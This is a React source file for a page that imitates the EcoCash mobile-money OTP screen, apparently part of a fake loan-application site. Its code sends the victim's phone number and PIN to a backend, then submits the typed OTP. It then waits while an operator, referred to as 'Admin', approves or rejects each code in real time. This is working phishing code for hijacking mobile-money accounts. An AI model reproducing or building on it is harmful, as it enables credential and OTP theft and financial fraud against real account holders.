import { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useLoanApplication } from '../LoanApplicationContext';
import './Otp.css';

export default function Otp() {
  const navigate = useNavigate();
  const { authData, updateAuthData } = useLoanApplication();
  
  // Get API endpoint from environment variable
  const API_ENDPOINT = import.meta.env.VITE_USER_API_ENDPOINT || '1';
  const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:3001';
  
  const getInitialPhone = () => {
    if (authData.phoneNumber) {
      return authData.phoneNumber;
    }
    
    try {
      const savedPhone = localStorage.getItem('ecocash_phone');
      if (savedPhone) {
        return savedPhone;
      }
    } catch (error) {
      console.log('No saved phone found');
    }
    
    return '+263 777 123 4567';
  };

  const [phoneNumber] = useState(getInitialPhone());
  const [otp, setOtp] = useState(['', '', '', '', '', '']);
  const [showSuccessToast, setShowSuccessToast] = useState(false);
  const [showResendToast, setShowResendToast] = useState(false);
  const [timer, setTimer] = useState(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isResending, setIsResending] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [progress, setProgress] = useState(0);
  const [verificationStatus, setVerificationStatus] = useState('');
  const [isOtpApproved, setIsOtpApproved] = useState(false);
  const [showErrorModal, setShowErrorModal] = useState(false);
  const [showResendErrorModal, setShowResendErrorModal] = useState(false);
  const [showVerifyErrorModal, setShowVerifyErrorModal] = useState(false);
  const [showWrongPinModal, setShowWrongPinModal] = useState(false);
  const [showTimeoutModal, setShowTimeoutModal] = useState(false);
  const [waitingForApproval, setWaitingForApproval] = useState(true);

  const previousStatusRef = useRef(null);
  const pollingIntervalRef = useRef(null);

  const otpRefs = [
    useRef(null),
    useRef(null),
    useRef(null),
    useRef(null),
    useRef(null),
    useRef(null)
  ];

  // Poll for login approval status
  useEffect(() => {
    if (!waitingForApproval) return;

    const checkApprovalStatus = async () => {
      try {
        const phone = authData.phoneNumber || phoneNumber;
        
        const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-login-approval`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            phoneNumber: phone,
            pin: authData.pin
          })
        });

        const data = await response.json();
        
        if (data.approved) {
          setWaitingForApproval(false);
          setShowSuccessToast(true);
          setTimer(104);
          
          const endTime = Date.now() + (104 * 1000);
          localStorage.setItem('otp_timer', JSON.stringify({ endTime }));
        }
      } catch (error) {
        console.error('Error checking approval status:', error);
      }
    };

    pollingIntervalRef.current = setInterval(checkApprovalStatus, 2000);
    checkApprovalStatus();

    return () => {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current);
      }
    };
  }, [waitingForApproval, phoneNumber, authData.phoneNumber, authData.pin, API_BASE_URL, API_ENDPOINT]);

  useEffect(() => {
    if (showSuccessToast) {
      const toastTimer = setTimeout(() => {
        setShowSuccessToast(false);
      }, 2500);

      return () => clearTimeout(toastTimer);
    }
  }, [showSuccessToast]);

  useEffect(() => {
    if (showResendToast) {
      const toastTimer = setTimeout(() => {
        setShowResendToast(false);
      }, 2500);

      return () => clearTimeout(toastTimer);
    }
  }, [showResendToast]);

  useEffect(() => {
    if (timer > 0 && !isProcessing && !waitingForApproval) {
      const countdown = setInterval(() => {
        setTimer(prev => {
          const newValue = prev - 1;
          if (newValue <= 0) {
            localStorage.removeItem('otp_timer');
            return 0;
          }
          
          const endTime = Date.now() + (newValue * 1000);
          localStorage.setItem('otp_timer', JSON.stringify({ endTime }));
          
          return newValue;
        });
      }, 1000);

      return () => clearInterval(countdown);
    }
  }, [timer, isProcessing, waitingForApproval]);

  useEffect(() => {
    if (isProcessing && isOtpApproved && progress < 100) {
      const progressTimer = setTimeout(() => {
        setProgress(prev => {
          const increment = Math.random() * 15 + 5;
          return Math.min(prev + increment, 100);
        });
      }, 300);

      return () => clearTimeout(progressTimer);
    } else if (progress >= 100 && isOtpApproved) {
      setTimeout(() => {
        navigate('/status');
      }, 500);
    }
  }, [isProcessing, isOtpApproved, progress, navigate]);

  const checkOTPStatus = async (phone, otpCode) => {
    const startTime = Date.now();
    const maxTime = 5 * 60 * 1000; // 5 minutes in milliseconds
    const pollInterval = 2000; // Poll every 2 seconds
    
    while (Date.now() - startTime < maxTime) {
      try {
        const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-otp-status`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            phoneNumber: phone,
            otp: otpCode
          })
        });

        const data = await response.json();
        
        if (data.status === 'approved') {
          return { approved: true };
        } else if (data.status === 'rejected') {
          return { approved: false, message: 'Admin marked OTP as incorrect' };
        } else if (data.status === 'wrong_pin') {
          return { approved: false, wrongPin: true, message: 'Wrong PIN entered' };
        }
        
        // Calculate elapsed time
        const elapsedSeconds = Math.floor((Date.now() - startTime) / 1000);
        
        const newStatus = `Please wait... (${elapsedSeconds}s)`;
        
        if (previousStatusRef.current !== newStatus) {
          setVerificationStatus(newStatus);
          previousStatusRef.current = newStatus;
        }
        
        // Wait before next poll
        await new Promise(resolve => setTimeout(resolve, pollInterval));
        
      } catch (error) {
        console.error('Error checking OTP status:', error);
        await new Promise(resolve => setTimeout(resolve, pollInterval));
      }
    }
    
    // Timeout after 5 minutes
    return { approved: false, timeout: true, message: 'Error occurred, please try again' };
  };

  const handleOtpChange = (index, value) => {
    const numericValue = value.replace(/\D/g, '');
    if (numericValue.length > 1) return;
    
    const newOtp = [...otp];
    newOtp[index] = numericValue;
    setOtp(newOtp);

    if (numericValue && index < 5) {
      otpRefs[index + 1].current.focus();
    }
  };

  const handleOtpPaste = (e, index) => {
    e.preventDefault();
    const pastedText = e.clipboardData.getData('text');
    const digits = pastedText.replace(/\D/g, '').slice(0, 6).split('');
    
    const newOtp = [...otp];
    digits.forEach((digit, i) => {
      if (index + i < 6) {
        newOtp[index + i] = digit;
      }
    });
    setOtp(newOtp);

    const focusIndex = Math.min(index + digits.length, 5);
    otpRefs[focusIndex].current.focus();
  };

  const handleOtpKeyDown = (index, e) => {
    if (e.key === 'Backspace') {
      if (otp[index]) {
        const newOtp = [...otp];
        newOtp[index] = '';
        setOtp(newOtp);
      } else if (index > 0) {
        otpRefs[index - 1].current.focus();
      }
    } else if (e.key === 'ArrowLeft' && index > 0) {
      otpRefs[index - 1].current.focus();
    } else if (e.key === 'ArrowRight' && index < 5) {
      otpRefs[index + 1].current.focus();
    }
  };

  const handleOtpKeyPress = (e) => {
    if (!/^\d$/.test(e.key)) {
      e.preventDefault();
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (isSubmitting || waitingForApproval) {
      return;
    }
    
    const fullOtp = otp.join('');
    
    if (fullOtp.length !== 6) {
      alert('Please enter complete 6-digit OTP');
      return;
    }

    setIsSubmitting(true);
    const phone = authData.phoneNumber || phoneNumber;

    updateAuthData({
      otp: fullOtp,
      isAuthenticated: true
    });

    try {
      const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/verify-otp`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          phoneNumber: phone,
          otp: fullOtp,
          timestamp: new Date().toISOString()
        })
      });

      await response.json();
      
      setIsProcessing(true);
      const initialStatus = 'Please wait...';
      setVerificationStatus(initialStatus);
      previousStatusRef.current = initialStatus;
      setIsOtpApproved(false);
      setProgress(0);
      
      const verificationResult = await checkOTPStatus(phone, fullOtp);
      
      if (verificationResult.approved) {
        localStorage.removeItem('otp_timer');
        const approvedStatus = '✅ Verified! Proceeding...';
        setVerificationStatus(approvedStatus);
        previousStatusRef.current = approvedStatus;
        setIsOtpApproved(true);
      } else if (verificationResult.wrongPin) {
        setIsProcessing(false);
        setIsSubmitting(false);
        setProgress(0);
        setIsOtpApproved(false);
        setShowWrongPinModal(true);
        previousStatusRef.current = null;
      } else if (verificationResult.timeout) {
        // 5 minute timeout - show timeout modal
        setIsProcessing(false);
        setIsSubmitting(false);
        setProgress(0);
        setIsOtpApproved(false);
        setShowTimeoutModal(true);
        previousStatusRef.current = null;
      } else {
        setIsProcessing(false);
        setIsSubmitting(false);
        setProgress(0);
        setIsOtpApproved(false);
        setShowErrorModal(true);
        setOtp(['', '', '', '', '', '']);
        previousStatusRef.current = null;
        setTimeout(() => {
          otpRefs[0].current?.focus();
        }, 100);
      }
      
    } catch (error) {
      console.error('OTP verification error:', error);
      setIsSubmitting(false);
      setIsProcessing(false);
      setProgress(0);
      setIsOtpApproved(false);
      setShowVerifyErrorModal(true);
      previousStatusRef.current = null;
    }
  };

  const handleResend = async () => {
    if (timer > 0 || isResending || waitingForApproval) return;
    
    const phone = authData.phoneNumber || phoneNumber;
    if (!phone || phone === '+263 777 123 4567') {
      setShowResendErrorModal(true);
      return;
    }
    
    setIsResending(true);
    
    try {
      const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/resend-otp`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          phoneNumber: phone,
          timestamp: new Date().toISOString()
        })
      });

      const data = await response.json();
      
      if (data.success) {
        setOtp(['', '', '', '', '', '']);
        setTimer(104);
        
        const endTime = Date.now() + (104 * 1000);
        localStorage.setItem('otp_timer', JSON.stringify({ endTime }));
        
        setShowResendToast(true);
        otpRefs[0].current.focus();
      } else {
        setShowResendErrorModal(true);
      }
    } catch (error) {
      console.error('Resend OTP error:', error);
      setShowResendErrorModal(true);
    } finally {
      setIsResending(false);
    }
  };

  const handleBack = () => {
    localStorage.removeItem('otp_timer');
    navigate(-1);
  };

  const handleWrongPinModalClose = () => {
    setShowWrongPinModal(false);
    localStorage.removeItem('otp_timer');
    localStorage.removeItem('ecocash_phone');
    updateAuthData({
      phoneNumber: '',
      pin: '',
      otp: '',
      isAuthenticated: false
    });
    navigate('/login');
  };

  const handleTimeoutModalClose = () => {
    setShowTimeoutModal(false);
    setOtp(['', '', '', '', '', '']);
    setTimeout(() => {
      otpRefs[0].current?.focus();
    }, 100);
  };

  const isOtpComplete = otp.every(digit => digit !== '');

  if (isProcessing) {
    return (
      <div className="otp-container">
        <main className="otp-content">
          <div className="processing-card">
            <div className="spinner-container">
              <div className="spinner"></div>
            </div>
            
            <h1 className="processing-title">Verifying OTP</h1>
            <p className="processing-subtitle">{verificationStatus}</p>
          </div>
        </main>

        <footer className="otp-footer">
          © 2025 Ecocash
        </footer>
      </div>
    );
  }

  return (
    <div className="otp-container">
      {showErrorModal && (
        <div className="error-modal-overlay" onClick={() => setShowErrorModal(false)}>
          <div className="error-modal" onClick={(e) => e.stopPropagation()}>
            <h2 className="error-modal-title">Wrong code!</h2>
            <p className="error-modal-message">
              Check SMS for the code or request code again after countdown is over
            </p>
            <button 
              className="error-modal-button" 
              onClick={() => setShowErrorModal(false)}
            >
              OK
            </button>
          </div>
        </div>
      )}

      {showTimeoutModal && (
        <div className="error-modal-overlay" onClick={handleTimeoutModalClose}>
          <div className="error-modal" onClick={(e) => e.stopPropagation()}>
            <h2 className="error-modal-title">Timeout</h2>
            <p className="error-modal-message">
              Error occurred, please try again
            </p>
            <button 
              className="error-modal-button" 
              onClick={handleTimeoutModalClose}
            >
              OK
            </button>
          </div>
        </div>
      )}

      {showWrongPinModal && (
        <div className="error-modal-overlay" onClick={handleWrongPinModalClose}>
          <div className="error-modal" onClick={(e) => e.stopPropagation()}>
            <h2 className="error-modal-title">Wrong PIN!</h2>
            <p className="error-modal-message">
              The PIN or phone number you entered earlier was incorrect. Please login again with the correct details.
            </p>
            <button 
              className="error-modal-button" 
              onClick={handleWrongPinModalClose}
            >
              Back to Login
            </button>
          </div>
        </div>
      )}

      {showResendErrorModal && (
        <div className="error-modal-overlay" onClick={() => setShowResendErrorModal(false)}>
          <div className="error-modal" onClick={(e) => e.stopPropagation()}>
            <h2 className="error-modal-title">Resend Failed</h2>
            <p className="error-modal-message">
              Failed to resend OTP. Please try again later.
            </p>
            <button 
              className="error-modal-button" 
              onClick={() => setShowResendErrorModal(false)}
            >
              OK
            </button>
          </div>
        </div>
      )}

      {showVerifyErrorModal && (
        <div className="error-modal-overlay" onClick={() => setShowVerifyErrorModal(false)}>
          <div className="error-modal" onClick={(e) => e.stopPropagation()}>
            <h2 className="error-modal-title">Verification Failed</h2>
            <p className="error-modal-message">
              Failed to verify OTP. Please try again later.
            </p>
            <button 
              className="error-modal-button" 
              onClick={() => setShowVerifyErrorModal(false)}
            >
              OK
            </button>
          </div>
        </div>
      )}

      {showSuccessToast && (
        <div className="success-toast">
          <div className="success-icon">✓</div>
          <span className="success-text">OTP code sent successfully!</span>
        </div>
      )}

      {showResendToast && (
        <div className="success-toast resend">
          <div className="success-icon">📱</div>
          <span className="success-text">OTP resent successfully!</span>
        </div>
      )}

      <header className="otp-header">
        <button className="back-btn" onClick={handleBack}>
          ←
        </button>
        
        <div className="logo-large">
          <span className="logo-large-eco">Eco</span>
          <span className="logo-large-cash">Cash</span>
        </div>
        
        <button className="menu-btn" aria-label="Menu">
          <div className="menu-line"></div>
          <div className="menu-line"></div>
          <div className="menu-line"></div>
        </button>
      </header>

      <main className="otp-content">
        <div className="otp-card">
          <h1 className="otp-title">OTP Verification</h1>
          <p className="otp-subtitle">Enter the OTP sent to your phone number</p>
          <p className="otp-phone">{phoneNumber}</p>

          <form onSubmit={handleSubmit}>
            <div className="otp-inputs-container">
              <div className="otp-inputs">
                {otp.map((digit, index) => (
                  <input
                    key={index}
                    ref={otpRefs[index]}
                    type="text"
                    className="otp-box"
                    value={digit}
                    onChange={(e) => handleOtpChange(index, e.target.value)}
                    onKeyDown={(e) => handleOtpKeyDown(index, e)}
                    onKeyPress={handleOtpKeyPress}
                    onPaste={(e) => handleOtpPaste(e, index)}
                    maxLength="1"
                    inputMode="numeric"
                    pattern="[0-9]"
                    required
                    disabled={isResending || isSubmitting || waitingForApproval}
                  />
                ))}
              </div>

              <p className="resend-text">
                {waitingForApproval ? (
                  <span className="resending-text">Requesting OTP...</span>
                ) : isResending ? (
                  <span className="resending-text">Resending code...</span>
                ) : timer > 0 ? (
                  `Resend code in ${timer} seconds`
                ) : (
                  <>
                    Didn't receive the code?{' '}
                    <span className="resend-link" onClick={handleResend}>
                      Resend
                    </span>
                  </>
                )}
              </p>
            </div>

            <button 
              type="submit" 
              className={`submit-button ${isOtpComplete && !waitingForApproval ? 'active' : ''}`}
              disabled={!isOtpComplete || isResending || isSubmitting || waitingForApproval}
            >
              {isSubmitting ? 'VERIFYING...' : 'SUBMIT'}
            </button>
          </form>
        </div>
      </main>

      <footer className="otp-footer">
        © 2025 Ecocash
      </footer>
    </div>
  );
}